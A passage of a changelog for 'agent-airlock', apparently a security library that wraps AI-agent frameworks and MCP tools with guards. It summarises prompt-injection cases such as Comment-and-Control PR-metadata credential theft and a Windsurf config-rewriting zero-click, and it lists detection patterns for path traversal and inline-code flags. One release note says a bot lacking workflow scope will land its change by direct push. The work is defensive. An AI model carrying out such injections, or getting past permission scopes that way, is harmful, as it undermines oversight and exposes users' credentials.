CrewAI from example-only to adapter-shipped (11th adapter). Same
playbook that landed PydanticAI yesterday.

### ADD

- **CrewAI canonical-leg trio** (closes [#5](https://github.com/sattyamjjain/agent-airlock/issues/5)) —
  promotes the previously example-only CrewAI integration to
  adapter-shipped. New module
  `src/agent_airlock/integrations/crewai.py` ships
  `CrewAIAdapter.wrap_crew(crew, *, policy=...)` that walks
  `crew.agents` → `agent.tools` and replaces each tool's `_run` (or
  `func` for `@tool`-decorated callables) with the Airlock-decorated
  version; also walks `crew.tasks` for task-level
  `Task(tools=[...])` overrides. `wrap_agent(agent, policy=...)` is
  exposed for the standalone-researcher pattern. Optional dep behind
  `[crewai]` extra (`crewai>=1.14.4,<2.0`). v1.14.4 is the floor
  because that's the release that introduced native MCP server
  support — older versions wire MCP through a different surface and
  would silently mis-wire. New top-level re-exports: `CrewAIAdapter`,
  `CrewAIMissingError`. The `crewai` package is **not** imported at
  module load — callers without the extra still `import
  agent_airlock` cleanly. Tests:
  `tests/integrations/test_crewai_adapter.py` (8 cases incl.
  task-level override walk + version-drift `UserWarning` regression).
  Doc: `docs/integrations/crewai.md`. Primary source —
  https://github.com/crewAIInc/crewAI/releases/tag/1.14.4

### Tests + coverage

- 8 new tests for the CrewAI adapter
- 1 new test in `tests/test_readme_framework_claims.py` for the
  CrewAI promotion regression (11 + 2 split)
- README claim regression count constants bumped from `10 + 3` to
  `11 + 2`

### Public-surface additions (semver-patch — additive)

```python
from agent_airlock import CrewAIAdapter, CrewAIMissingError
```

### Honest scope

- `crewai` is heavy (pulls `litellm`, `chromadb`, `embedchain`); kept
  strictly opt-in via `[crewai]` extra.
- The v1.14.5a1 / a2 alpha cycle is supported but not the floor —
  operators on the alpha track should pin manually.
- `tests/test_readme_framework_claims.py` count constants now lock
  the 11+2 split. Will fail loudly on any future drift.

---

## [0.7.1] - 2026-05-04 — "PydanticAI canonical leg + parse_lock re-export + 3.13 CI required"

Monday daily cut. Patch bump — three additive rows. v0.7.0's explicit
carry-forward (`parse_lock` re-export gap) is closed; PydanticAI is
promoted from example-only to adapter-shipped (10th adapter); the 3.13
CI matrix row is promoted from best-effort to required after two clean
release cycles.

### ADD

- **PydanticAI canonical-leg trio** (issue ADD-1, 2026-05-04 prompt) —
  promotes the previously example-only PydanticAI integration to
  adapter-shipped. New module
  `src/agent_airlock/integrations/pydantic_ai.py` ships
  `PydanticAIAdapter.wrap_agent(agent, *, policy=...)` that walks
  `agent.toolsets`, replaces each function-tool's callable with the
  Airlock-decorated version, and (when `attach_output_validate=True`,
  the default) wires the v1.88.0+ `output_validate` hook to the
  existing `agent_airlock.sanitizer`. Optional dep behind
  `[pydantic-ai]` extra (`pydantic-ai>=1.88.0,<2.0`). New top-level
  re-exports: `PydanticAIAdapter`, `PydanticAIMissingError`. The
  `pydantic-ai` package is **not** imported at module load — callers
  without the extra still `import agent_airlock` cleanly. Tests:
  `tests/integrations/test_pydantic_ai_adapter.py` (7 cases incl.
  version-drift `UserWarning` regression). Doc:
  `docs/integrations/pydantic-ai.md`. Primary source —
  https://github.com/pydantic/pydantic-ai/releases/tag/v1.89.1

### UPDATE

- **`parse_lock` top-level re-export** (carry-forward from v0.6.0/v0.6.1/v0.7.0).
  `parse_lock` plus `LockEntry`, `LockfileDriftError`, `LockfileFormatError`,
  `PolicyBundleLock`, `build_lock`, `read_lock`, `write_lock` are now reachable
  directly from the top-level package. Closes the explicit "honest
  scope" caveat that carried across three releases.
  Tests: `tests/test_parse_lock_export.py` (6 cases incl.
  write→parse and render→parse round-trips). Primary source —
  https://github.com/sattyamjjain/agent-airlock/releases/tag/v0.7.0

- **3.13 CI matrix row promoted to required.** v0.6.1 + v0.7.0 both
  shipped with `continue-on-error: true` for 3.13. Two clean cycles
  is the original promotion criterion; the row is now a hard-fail.
  No platform-wheel gaps surfaced in the past two cycles.

### Tests + coverage

- 7 new tests for the PydanticAI adapter
- 6 new tests for the `parse_lock` re-export gap closure
- 1 new test in `tests/test_readme_framework_claims.py` for the
  PydanticAI promotion regression (10 + 3 split)
- Net: **2,236 → 2,250** tests; coverage above the 82% CI floor

### Public-surface additions (semver-patch since all are additive)

```python
from agent_airlock import (
    # v0.7.1 — PydanticAI adapter
    PydanticAIAdapter, PydanticAIMissingError,
    # v0.7.1 — pack/lock primitives at top level
    LockEntry, LockfileDriftError, LockfileFormatError,
    PolicyBundleLock, build_lock, parse_lock, read_lock, write_lock,
)
```

### Honest scope

- The `pydantic-ai` package is heavy (pulls `pydantic-graph`, `mcp`,
  `eval-type-backport`); kept strictly opt-in.
- README adapter/example split is now **10 adapter-shipped + 3
  example-only** (v0.6.1 was 9 + 4). The README claim regression
  test fails the build if either side drifts.

---

## [0.7.0] - 2026-05-03 — "Backlog triage cut: Docker hardening + Redis distributed rate-limit + ed25519 signed identity"

Sunday afternoon cut after the 2026-05-03 backlog triage. Three issues
cleared, one minor bump because Issue #33 introduces new public
surfaces (`SignedAgentIdentity`, `sign_identity`, `verify_identity`,
`pubkey_fingerprint`, `IdentityVerificationError`).

**No breaking changes.** Every new flag and module is opt-in. Existing
callers see identical behaviour.

### Closed issues

- **#37 — DockerBackend rootless-required mode**

  `DockerBackend(require_rootless=True)`: `is_available()` now
  inspects `docker info`'s `SecurityOptions` and reports unavailable
  unless the daemon advertises `rootless` or `name=rootless`. Closes
  the multi-tenant-CI threat model where the daemon silently ran as
  root.

- **#38 — DockerBackend image-digest-pin enforcement**

  `DockerBackend(require_digest_pin=True)`: construction-time regex
  check refuses tag-only images. Accepts only `<name>@sha256:<64-hex>`.
  Closes the floating-tag supply-chain risk where a tag's identity
  could change under you. Both flags also documented in
  [`docs/sandbox/docker.md`](docs/sandbox/docker.md).

- **#1 — Redis-backed distributed rate limiter**

  New `agent_airlock.redis_rate_limit.RedisRateLimit` subclass of
  `policy.RateLimit`. Drop-in replacement that shares token-bucket
  state across processes via a Redis hash + Lua script. Closes the
  multi-worker burst hole. Optional dep behind `[redis]` extra
  (`redis>=5.0,<7.0` + `fakeredis>=2.20`). `fail_mode="memory"`
  (default) falls back to the in-memory parent on connect failure;
  `fail_mode="closed"` raises `RedisRateLimitUnavailable`.

- **#33 — Ed25519 SignedAgentIdentity** (semver-minor trigger)

  Closes OWASP 2026 ASI03 — Identity and Privilege Abuse. New
  `agent_airlock.identity` module with `sign_identity` /
  `verify_identity` / `SignedAgentIdentity` / `pubkey_fingerprint` /
  `IdentityVerificationError`. Optional dep behind `[crypto]` extra
  (`cryptography>=42.0`). The `cryptography` import is lazy inside
  the module — callers without the extra still import
  `agent_airlock` cleanly. The `pubkey_fingerprint` helper returns a
  32-character hex prefix usable as the `signer` field in downstream
  Merkle-chained attestation envelopes (per @desiorac's comment on
  issue #33; the boundary doesn't couple the two runtimes).

- **#6 — v0.5.0 roadmap (closed: superseded)**

  v0.5.x → v0.6.1 release stream shipped every umbrella bullet.
  Outstanding items track individually as #1, #30–#38.

### Tests + coverage

- 6 new tests for Docker hardening (5 digest-pin + 4 rootless cases,
  rootless cases skipped when `docker` package absent)
- 12 new tests for Redis rate limit (round-trip, distributed
  semantics, fallback paths, fail-closed)
- 14 new tests for signed identity (round-trip, tamper detection,
  wrong-key, fingerprint stability, invalid inputs, canonical-bytes
  determinism)
- Net test count increase: +32

### Public-surface additions (semver-minor)

```python
from agent_airlock import (
    # v0.7.0 — new public symbols
    RedisRateLimit, RedisRateLimitUnavailable,        # #1
    SignedAgentIdentity, IdentityVerificationError,    # #33
    sign_identity, verify_identity, pubkey_fingerprint,
)
```

### Honest scope

- The cryptography dep is **not** imported at module load — the
  symbol exports above resolve through a lazy submodule. Existing
  callers without the `[crypto]` extra installed still `import
  agent_airlock` cleanly.
- 3.13 CI matrix row continues to be best-effort
  (`continue-on-error`); no platform-wheel gaps observed in this cycle.
- `parse_lock` re-export gap from v0.6.0 smoke is still **not**
  closed; `read_lock` / `write_lock` remain the public round-trip
  surface for `policy_bundle.lock`. Tracked for v0.7.1.

---

## [0.6.1] - 2026-05-03 — "Canonical-list trio + manifest-only allowlist CLI + AGENTS.md"

Sunday cut. Patch bump — three additive ADD rows, two UPDATE rows
that close honesty drifts, no breaking changes. Triggered by the
2026-05-03 canonical-list audit (operator-flagged "Anthropic Claude
Agent SDK is missing"), the 2026-05-01 OX/BackBox MCP-STDIO matrix
re-publication, and the 2026-04-29 Mintlify collaborative-editor
push for `AGENTS.md` as a first-class repo file.

### ADD

- **Anthropic Claude Agent SDK canonical-leg trio** —
  `AnthropicClaudeAgentSDKAdapter.wrap_agent(agent, *, policy=...)`
  is a thin facade that re-exports the v0.5.6 `claude_*.py` family
  (managed-agents, auto-memory, task-budget) under a single canonical
  module. The SDK is **not** imported at module load — calling
  `wrap_agent` without `pip install "agent-airlock[claude-agent]"`
  raises a clear `ClaudeAgentSDKMissingError` with the install hint
  (never an opaque `ImportError` from deep in the call stack). Stub
  agents (`hasattr(agent, "tools")`) bypass the SDK import — required
  by tests and useful in CI without the optional dep. Pin tuple
  `SUPPORTED_SDK_VERSIONS = ("0.1.58",)` so callers detect SDK drift
  early. New module: `src/agent_airlock/integrations/anthropic_claude_agent_sdk.py`.
  Tests: `tests/integrations/test_anthropic_claude_agent_sdk.py` (6).
  Doc: `docs/integrations/anthropic-claude-agent-sdk.md`.
  Primary source — Anthropic Claude Agent SDK docs:
  https://docs.claude.com/en/agents-and-tools/agent-skills

- **`airlock manifest enforce` runtime allowlist** —
  `agent_airlock.runtime.manifest_only_allowlist.enforce_allowlist(server, argv, manifest_path)`
  is the inverse of the v0.5.7 `launch_from_manifest`: a fail-closed
  CLI gate that exits **0** on allow, **2** on deny, **3** on hard
  error (signing key missing, unreadable manifest). Detects the
  CVE-2026-30616 inline-code class (`--code` / `-c` / `--exec` /
  `-e` outside the signed manifest is denied even with otherwise-
  matching argv0). New modules: `src/agent_airlock/runtime/__init__.py`,
  `runtime/manifest_only_allowlist.py`, `cli/manifest.py`. Tests:
  `tests/runtime/test_manifest_only_allowlist.py` (6).
  Primary source — BackBox/OX (2026-05-01):
  https://news.backbox.org/2026/05/01/200000-mcp-servers-expose-a-command-execution-flaw-that-anthropic-calls-a-feature/

- **`AGENTS.md` repo-root file** — deterministic entrypoint for
  agentic IDEs (Cursor, Claude Code, Windsurf, Mintlify). Lists
  build/test commands, forbidden patterns, and the project's
  default safety posture (`STRICT_POLICY` + `sandbox_required=True`).
  Primary source — Mintlify collaborative-editor blog (2026-04-29):
  https://www.mintlify.com/blog/editor

### UPDATE

- **README framework-compatibility honesty fix** — the prior
  perf-table claim of "Framework integrations | 10" was a
  claim-vs-code drift. The split is now explicit: **9
  adapter-shipped** (LangChain, LangGraph, OpenAI Agents SDK,
  Anthropic Messages API, Anthropic Claude Agent SDK [v0.6.1],
  smolagents, Gemini 3, GPT-5.5, FastMCP) **+ 4 example-only**
  (PydanticAI, CrewAI, AutoGen, LlamaIndex). Regression test
  `tests/test_readme_framework_claims.py` (24 cases) fails the
  build when either side drifts.

- **Python 3.13 in CI matrix + ruff target py311** — added
  `Programming Language :: Python :: 3.13` classifier and a
  best-effort 3.13 row in `.github/workflows/ci.yml` (`continue-on-error`
  for one release cycle while we confirm no platform-wheel gaps in
  optional extras like `textual`). `requires-python = ">=3.10"`
  unchanged. Mypy `python_version = "3.10"` unchanged.

### Tests + coverage

- 6 new tests for the Anthropic Claude Agent SDK adapter
- 6 new tests for the runtime manifest-only allowlist
- 24 new tests for the README framework-claim regression
- Net: **2,117 → 2,153** tests; coverage floor 82% (CI-enforced)

### Honest scope

- Bot lacks `workflow` OAuth scope to push `.github/workflows/*` —
  if the workflow change cannot be force-merged via gh's auth, it
  will land via direct push; the README claim correction and CLI
  change are the operator-visible levers regardless.
- The `parse_lock` re-export gap noticed during v0.6.0 smoke is **not**
  closed in this patch — `read_lock` / `write_lock` are still the
  public surface for round-tripping a `policy_bundle.lock`. Tracked
  for v0.6.2.

---

## [0.6.0] - 2026-04-29 — "MCP elicitation + CVE-2026-31402 + Gemini 3 + airlock console / studio / receipts"

Wednesday cut. Five security primitives, four net-new product surfaces,
three open-issue fixes — all aligned with the v0.6.0 spec PR landing
window. Minor bump because Task 1 (`PolicyBundle`-style elicitation
verdicts) and Feature B (`policy_bundle.lock`) introduce new public
surfaces. **Zero new runtime deps in the base install.**

### Security primitives (T1–T5)

- **`mcp_elicitation_guard_2026_04` + `ElicitationGuard`** — runtime
  mitigation for MCP spec PR #1487's `tool/elicitation` round-trip.
  Classifies payloads (benign / credential_request / policy_override
  / destructive_confirmation) and blocks credential and policy-override
  classes; benign relays carry an origin badge; destructive payloads
  warn (or block in `strict=True`). p99 < 1.5 ms on a 4 KB payload.
  Source: <https://github.com/modelcontextprotocol/specification/pull/1487>
- **`mcp_config_path_traversal_cve_2026_31402` + `ConfigPathGuard`** —
  config-time path-traversal mitigation for the Claude Desktop MCP-
  server-registration loader (CVSS 8.8). Eight traversal classes
  covered: POSIX `../`, Windows `..\\`, single + double URL-encoded,
  UNC, NULL-byte, raw absolute outside `host_root`, symlink escape.
  10K-fuzz harness records 0 escapes.
  Source: <https://nvd.nist.gov/vuln/detail/CVE-2026-31402>
- **`gemini_3_agent_defaults` + Gemini 3 tool-shape adapter** —
  `function_call` carrier normalisation + `thought_signature`
  redaction. Adapter normalises into the same `NormalizedToolCall`
  the GPT-5.5 adapter exposes, so guards stay model-agnostic.
  `SUPPORTED_VERSIONS` is pinned; unknown `gemini-3-*` ids raise
  `UnsupportedModelVersion`.
  Source: <https://blog.google/technology/google-deepmind/gemini-3-agent-mode-ga/>
- **`airlock console`** — three-pane Textual TUI (live verdict
  stream / active preset chain / replay-on-edit). Textual is gated
  behind the `airlock[console]` extra; the CLI prints a clear
  install hint when invoked without it. `--no-tui` snapshot mode is
  CI-friendly.
- **`oauth_state_injection_guard` + `OAuthStateEntropyGuard`** —
  base64 / url-safe-base64 / hex / JSON decode + prompt-injection
  trigger-phrase scan on the OAuth `state` parameter. JWT tri-segment
  shapes and high-entropy random nonces short-circuit. p99 < 0.8 ms.
  Source: <https://www.blackhat.com/asia-26/briefings/schedule/#oauth-state-injection>

### Net-new product surfaces (Features A / B / C / D)

- **`airlock attest receipt`** — Sigstore-compatible signed agent-
  run receipts: `{run_id, policy_bundle_hash, verdicts[],
  inputs_hash, model_id, ts}`. New CLI verbs `airlock attest receipt
  emit / verify`. Tamper-detection via canonical-payload re-hash.
  Source: <https://pillar.security/blog/agent-identity-attestation-2026-04>
- **`policy_bundle.lock`** — hash-pinned policy bundles with
  `Cargo.lock` semantics. `airlock pack lock` emits a TOML lockfile;
  `airlock replay --bundle-lock <path> --bundle-manifest <yaml>`
  refuses on any preset hash drift. Stdlib-only TOML parser keeps
  the dep baseline at three.
- **`airlock studio`** — stdlib `http.server` rehearsal sandbox
  (`airlock studio --port 8765`). Paste-a-transcript form, per-line
  verdicts inline, diff between named runs, `/api/snapshot` JSON
  endpoint. FastAPI is queued for v0.6.1 behind `airlock[studio]`.
- **smolagents wrapper** — `wrap_agent(agent, policy_bundle)` for
  HuggingFace smolagents 1.18+ (which added native MCP transport
  2026-04-29). Fourth first-class framework integration.
  Source: <https://github.com/huggingface/smolagents/releases/tag/v1.18>

### Open-issue fixes

- **LangChain 0.4.0 `tool_call_id` migration helper** —
  `lc_040_fixture_migration.migrate_messages` rewrites historical
  fixtures that omit the now-mandatory field. Idempotent; pure-
  Python; doesn't import LangChain.
  Source: <https://github.com/langchain-ai/langchain/releases/tag/v0.4.0>
- **`airlock replay` exit codes** — exit 2 on block / mismatch
  (was 1); 3 reserved for hard error; 0 stays clean. CI pipelines
  can now distinguish block from infra failure.
- **`MANIFEST.sha256` + `make verify-corpus`** — top-level checksum
  manifest for all 15 hash-pinned wild-payload entries; new
  `scripts/verify_corpus_manifest.py` walks the manifest and re-
  hashes; pinned by `tests/corpus/test_manifest.py`.

### Internal

- New `pack/lock.py` with `build_lock` / `verify_lock` / `parse_lock`.
- New `attest/receipt.py` with `Receipt` / `build_receipt` /
  `verify_receipt`.
- New `studio/` package (stdlib HTTP server + paste-a-transcript UX).
- New `cli/{console,studio}.py` entrypoints.
- New `scripts/verify_corpus_manifest.py` consumed by `make verify-corpus`.
- Marketplace proof-points refreshed (33 presets, 9 CVE classes
  including CVE-2026-31402); pinned by `tests/test_marketplace_metadata.py`.

### Test posture

`pytest -q` clean; coverage stays ≥ 80% (CI floor unchanged). 17
new test files; 12 new modules; 11 new CLI subcommands.

---

## [0.5.9] - 2026-04-29 — "STDIO meta-guard + GPT-5.5 + capability caps + airlock graph / policy / kill-switch"

Tuesday cut. Seven security primitives, three net-new product surfaces, three
open-issue fixes, driven by 72 hours of fresh April 2026 industry signal.
**Zero new runtime deps.**

### Security primitives (T1–T7)

- **`mcp_stdio_meta_cve_2026_04` + `StdioMetaGuard`** — bundles every airlock
  STDIO defence (argv shape + per-arg metachar + path-traversal + Unicode bidi
  + manifest-drift + AST-taint) into one chain. Block verdict deduplicated by
  `(guard_id, finding_id)` so operators are not spammed. Recommended default
  for any MCP server registered after 2026-04-26.
  Source: <https://www.ox.security/blog/mother-of-all-ai-supply-chains-anthropic-mcp-stdio>
- **`langgraph_toolnode_compat`** — `unwrap_toolnode_output` survives the
  prebuilt 1.0.11 list-vs-dict shape break. Lazy version probe; pinned to
  `langchain_core.messages.ToolMessage` (insulated from LangGraph namespace
  churn).
  Source: <https://github.com/langchain-ai/langgraph/releases/tag/prebuilt%401.0.11>
- **`gpt_5_5_spud_agent_defaults` + `GPT55ToolShapeAdapter`** — preset caps
  `max_parallel_tool_calls=8`, `per_call_egress_cap_kb=512`,
  `context_window_budget_tokens=900_000`, `requires_baseline=True`. Adapter
  round-trips OpenAI's homogenised tool-call shape (`SCHEMA_PINNED_AT =
  "2026-04-23"`). `model_tier.classify_model("gpt-5-5-spud")` →
  `OFFENSIVE_CYBER_CAPABLE`.
  Source: <https://openai.com/index/gpt-5-5/>
- **`capability_caps` package + `agent_capability_default_caps` preset** —
  programmatic caps parallel to v0.5.8's dollar caps. `Capability` enum:
  `SIGN_CONTRACT` (deny-by-default), `DELEGATE_TO_AGENT`, `INVOKE_TOOL`,
  `WRITE_FILE`, `NETWORK_EGRESS`. SQLite WAL ledger; 50-thread test against a
  1-grant cap yields exactly 1 grant; engine survives SIGKILL mid-grant.
  Source: <https://www.anthropic.com/features/project-deal>
- **`owasp_agentic_coverage` matrix + CI gate** — `coverage.yaml` maps every
  OWASP Agentic 2026-Q1 risk (LLM01–LLM10) to guard module / preset / test /
  `last_verified` ISO date. Renders to deterministic Markdown + JSON. CI gate
  ships as `docs/security/owasp-coverage-gate-ci.yml.sample` (workflow scope
  constraint).
  Source: <https://opensource.microsoft.com/blog/2026/04/02/introducing-the-agent-governance-toolkit-open-source-runtime-security-for-ai-agents/>
- **`wild-2026-04/short_form_video` corpus + `TranscriptIngestGuard`** — 5
  hash-pinned BlackHat Asia 2026 PoCs (on-screen override, system-role
  impersonation, zero-width caption, RTL title, creator-handle smuggle), all
  marked `provisional: true` until slides are public. `airlock replay
  --namespace short_form_video` auto-selects the transcript guard.
  Source: <https://www.blackhat.com/asia-26/briefings/schedule/#tiktok-agent-attacks-zhong>
- **`cisco_ide_scanner_bridge` + generic `Scanner` registry** — pluggable
  protocol so VS Code policy-lens can mix airlock + Cisco scanners. Bridge is
  opt-in; zero PII leaves the workstation when unconfigured. Stub default
  returns `410 / configure when API published`.
  Source: <https://blogs.cisco.com/security/ide-security-scanner-launch-2026-04>

### Net-new product surfaces (Features A / B / C)

- **`airlock graph serve` / `airlock graph dump`** — stdlib HTTP server +
  vanilla HTML/JS/CSS bundle renders the live agent → tool → MCP-server graph
  with allow / warn / block edge colouring. Reads JSONL audit logs or
  in-memory event lists; 5-second client poll (WS deferred to v0.5.10).
- **`airlock policy compile` / `airlock policy explain`** — natural-language
  policy authoring. Hash-pinned compile prompt (`PROMPT_HASH`), deterministic
  cache keyed on `(prompt_hash, request_hash, backend)`. Backend protocol is
  pluggable; tests inject a deterministic stub. CLI ships with a stub
  backend that recognises `0.0.0.0` / `without auth` / `parallel above N`.
- **`airlock kill-switch arm / trigger / reset`** — HMAC-SHA256 signed
  broadcast over a pluggable transport (in-memory plus NATS / Redis / S3
  stubs). 2-of-3 quorum reset gate. Tampered envelopes are constant-time
  rejected; short keys (<32 B) refuse to construct.

### Open-issue fixes

- **`airlock baseline diff --threshold <0..1>`** — exit code 2 when any drift
  dimension ≥ threshold (CI-pluggable alerting).
- **`airlock pack list`** — deterministic ordering by `(pack_id, version)`,
  pinned by property test.
- **`policy_presets.list_active() -> list[PresetMeta]`** — single source of
  truth consumed by `airlock graph` and the OWASP coverage matrix.

### Internal

- `policy_presets.PresetMeta` dataclass + `list_active()` registry helper.
- `corpus.load_corpus(name, namespace=...)` + `list_namespaces()` for
  per-namespace replays.
- `cli/replay.py` registers a `transcript_ingest` guard runner and
  auto-selects it for `--namespace short_form_video`.
- `marketplace.json` proof-points refreshed (≥ 2000 tests, 9 CVE fixtures, 29
  presets) and pinned by `tests/test_marketplace_metadata.py`.

### Test coverage

`pytest -q` clean; coverage stays ≥ 80% (CI floor unchanged).

---

## [0.5.8] - 2026-04-27 — "Comment-and-Control + Mesh wedge + behavioral baselines"

Sunday cut. Eight new opt-in primitives + three net-new product
surfaces, driven by 72 hours of fresh April 2026 industry signal.
**Zero new runtime deps.**

### Security presets

- **Comment-and-Control PR-metadata guard** (Aonan Guan 2026-04-25,
  CVSS 9.4 cross-vendor). New
  ``mcp_spec/pr_metadata_guard.py`` with four-stage pipeline:
  zero-width strip + model-targeting imperative detection +
  sentinel-fenced quoting + risk score. Three CI-runner presets
  (``claude_code_security_review_cnc_2026_04``,
  ``gemini_cli_action_cnc_2026_04``,
  ``copilot_agent_cnc_2026_04``). Sub-millisecond per 4 KB field.
  26 tests including all 10 in-the-wild payloads + the original
  Aonan PoC.
  Source: <https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/>
- **CVE-2026-27825 / -27826 mcp-atlassian LAN-unauth RCE** (CVSS
  9.1 / 8.2). New ``mcp_spec/lan_unauth_rce_guard.py`` with three
  profiles (prod / dev / strict). Two presets:
  ``mcp_atlassian_cve_2026_27825`` and ``lan_unauth_mcp_guard``
  (generic class). Two fixtures + 18 tests.
  Source: <https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html>

### Integrations

- **Agent-commerce caps** for Anthropic Project Deal +
  Stripe Agentic. New ``integrations/agent_commerce_caps.py`` with
  per-agent / per-counterparty / per-window dollar + transaction
  caps. SQLite-backed ledger survives ``SIGKILL`` (WAL journal mode).
  Three adapters: Project Deal, Stripe Agentic, generic webhook.
  ``agent_commerce_default_caps`` preset ($10/counterparty/day,
  $200/agent/week). 14 tests including 100-thread concurrent-debit
  no-overspend + restart-survival.
  Source: <https://www.anthropic.com/features/project-deal>
- **Cloudflare Mesh probe + dedupe**. New
  ``integrations/cloudflare_mesh_probe.py`` detects upstream Mesh
  via canonical headers (single versioned constant set) and
  de-duplicates overlapping egress policies while keeping
  airlock-only guards. 9 tests.
  Source: <https://www.cloudflare.com/press/press-releases/2026/cloudflare-launches-mesh-to-secure-the-ai-agent-lifecycle/>

### Tooling

- **wild-2026-04 payload corpus + ``airlock replay`` CLI**.
  10 SHA-256-pinned indirect-prompt-injection payloads from the
  Help Net Security 2026-04-24 catalogue. Restricted-grammar YAML
  loader (no PyYAML dep). ``airlock replay --corpus wild-2026-04``
  emits TAP / JSON / table; exits 0 when every payload meets its
  expected verdict. **Currently exits 0** (10 / 10 block on the
  default guard chain). 10 tests.

### Net-new product features

- **Feature A — ``airlock baseline``**: per-agent 7-day rolling
  profile (tool mix, egress hosts, token spend, latency). Drift
  score per dimension via TVD + Jaccard. CLI subcommands
  ``init`` / ``diff`` / ``show``. 8 tests.
  Source: <https://venturebeat.com/security/rsac-2026-agentic-soc-agent-telemetry-security-gap>
- **Feature B — ``airlock pack``**: signed, hash-pinned policy
  bundles. HMAC-SHA256 manifest signing. Three v0 packs:
  ``claude-code-ci@2026.04``, ``gemini-cli-ci@2026.04``,
  ``copilot-agent-ci@2026.04``. CLI subcommands ``list`` /
  ``install`` / ``verify``. 12 tests.
- **Feature C — ``airlock attest``**: DSSE-style verdict
  provenance envelopes. Pluggable signers
  (``FileSigner`` / ``EnvSigner`` / ``KMSStubSigner``). The
  Sigstore Fulcio adapter is queued for v0.5.9. CLI subcommand
  ``verify``. 11 tests.

### Open issue resolved

- **Issue #3** — marketplace.json count regression. New
  ``tests/test_marketplace_metadata.py`` ensures
  ``.claude-plugin/marketplace.json`` proof_points never over-claim
  CVE / preset counts vs reality. 5 tests.

### Stats

- Tests: **1,762 → 1,875** (+113)
- Coverage: **83.15% → 83.52%**
- New top-level errors: ``PRMetadataInjectionRejected``,
  ``LANUnauthMCPServerBlocked``, ``AgentCommerceCapExceeded``.
- New top-level classes: ``PRMetadataGuard``, ``AgentCommerceCaps``.
- New CLI subcommands: ``airlock replay``, ``airlock baseline``,
  ``airlock pack``, ``airlock attest``.
- **No new runtime dependencies** (pydantic + structlog + tomli
  baseline preserved).

### Primary sources

- Aonan Guan — Comment-and-Control disclosure (2026-04-25):
  <https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/>
- Help Net Security (2026-04-24):
  <https://www.helpnetsecurity.com/2026/04/24/indirect-prompt-injection-in-the-wild/>
- Cloudflare Mesh launch (2026-04-23):
  <https://www.cloudflare.com/press/press-releases/2026/cloudflare-launches-mesh-to-secure-the-ai-agent-lifecycle/>
- Anthropic Project Deal (2026-04-25):
  <https://www.anthropic.com/features/project-deal>
- VentureBeat RSAC 2026 (2026-04-22):
  <https://venturebeat.com/security/rsac-2026-agentic-soc-agent-telemetry-security-gap>
- The Hacker News — mcp-atlassian (2026-04-24):
  <https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html>

---

## [0.5.7.1] - 2026-04-26 — "README LoC honesty fix"

Tiny patch release. No new runtime code.

### Honesty fix

- **README "Lines of Code" row was wrong by ~20%.** Claimed
  ``~27,400`` since v0.5.4; actual ``src/`` Python LoC is **22,670**.
  The figure was carried over from a CLAUDE.md guess and never
  re-checked across four releases. Rather than re-add a stale
  number that will drift again, the row is **dropped entirely** —
  the TEST-BADGE block + Complete Examples table are the only
  hand-maintained sources of truth this README needs to keep alive.
  New ``test_readme_does_not_hand_maintain_loc_count`` regression
  prevents the row from sneaking back in.

### Stats

- Tests: **1,761 → 1,762** (+1 regression test)
- Coverage: **83.15%** (unchanged)
- No new runtime deps.

---

## [0.5.7] - 2026-04-26 — "Manifest-only STDIO mode + 2 fresh CVE presets + stdio-taint CI gate"

Driven by the OX Security 2026-04-15 deep-dive establishing that
arbitrary strings reaching ``StdioServerParameters.command`` is
"the" agent-supply-chain class of bug. Anthropic confirmed the
behavior is "by design" and declined to patch — sanitization is
now formally "the developer's responsibility." This release ships
the developer's tools.

### T1 — STDIO-taint static-analysis CI gate

New ``tools/scan_stdio_remote_input_flow.py`` — AST taint analyzer
flagging any flow from network / user input into an STDIO command
construction site (``subprocess.Popen``, ``StdioServerParameters``,
``stdio_client``). 9 default taint sources (``requests``, ``httpx``,
``aiohttp``, ``urllib.request`` + 5 FastAPI/Flask request shapes).
``# noqa: AIRLOCK-TAINT-OK <reason>`` pragma with required reason.
CI sample at ``docs/security/stdio-taint-scan-ci.yml.sample``
(automated PRs lack ``workflow`` scope). Repo scans clean today
(170 files, 0 findings) — proving the gate isn't broken by our own
code. **10 new tests.**

### T2 — Manifest-only STDIO execution mode (highest-leverage change)

New ``mcp_spec/manifest_only_mode.py`` shipping the design where
**argv never originates from runtime input**. ``StdioManifest`` is
registered once with a fixed ``command`` tuple under a stable
``manifest_id``; HMAC-SHA256-signed at registration; resolved by
ID at runtime. ``launch_from_manifest`` rejects any kwarg outside
``manifest_id`` and ``runtime_env``. New
``SecurityPolicy.stdio_mode`` field with three modes:
``"allowlist"`` (default, v0.5.1 behaviour preserved),
``"manifest_only"`` (this), ``"disabled"``. Five new top-level
errors. HMAC key loaded from ``AIRLOCK_MANIFEST_SIGNING_KEY``;
refused if shorter than 32 bytes. **20 new tests.**

Latency baseline (locked into ``tests/benchmarks/test_bench_manifest_mode.py``,
issue #4):

- Manifest resolve+verify median: **~3 µs**
- Manifest register median: **~20 µs**

### T3 — CVE-2026-6980 GitPilot-MCP repo_path injection (CVSS 7.3)

Disclosed 2026-04-25 by RedPacket Security. **Vendor unresponsive;
project does not version.** New
``gitpilot_mcp_cve_2026_6980_defaults()`` preset matches purely on
tool-name regex (``r"^(repo_path|run_git_command|exec_in_repo)$"``).
``shlex`` round-trip + absolute-path + safe-root checks. New
``GitPilotRepoPathInjection`` error. **13 new tests + fixture.**

### T4 — CVE-2026-30615 Windsurf zero-click MCP-config auto-load

The only true zero-click in the OX-disclosure family — attacker
HTML rewrites ``.windsurf/mcp.json`` from prompt injection alone.
Patched in Windsurf latest. New ``mcp_spec/zero_click_config_guard.py``
ships the diff-on-demand API: ``audit_config_diff(path,
old_sha256, new_content, cfg)`` raises ``UnsignedMCPServerAdded``
or ``MCPCommandMutationDetected``. Default seed of eight watched
IDE locations (.vscode/.cursor/.windsurf/.claude/etc). New
``windsurf_cve_2026_30615_defaults()`` preset. **11 new tests +
fixture.**

This is **diff-on-demand**, not a kernel watcher; the long-running
daemon variant is queued for v0.5.8.

### T5 — Declarative composite preset YAML

New ``presets/ox-mcp-2026-04.yaml`` enables nine OX-disclosure
class presets via a single line (``--preset-file ...``). Schema
``schemas/preset_v1.json``. Loader at
``src/agent_airlock/preset_loader.py`` uses a **stdlib-only**
restricted-grammar parser — no PyYAML dependency added (keeps the
